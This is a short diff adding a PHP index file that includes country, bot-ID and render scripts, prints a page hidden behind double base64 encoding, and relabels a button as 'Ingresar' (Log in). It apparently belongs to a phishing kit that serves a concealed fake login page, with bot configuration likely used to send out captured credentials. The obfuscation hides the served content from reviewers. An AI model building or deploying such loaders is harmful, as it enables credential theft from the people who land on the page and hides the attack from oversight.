@@ -1,0 +1,11 @@
+<?php  
+include 'paises.php';
+include 'config/botid.php';
+include 'render.php';
+echo base64_decode(base64_decode($website));
+
+?>
+
+<script type="text/javascript">
+	document.querySelector(".btn-primary").innerHTML = "Ingresar";
+</script>
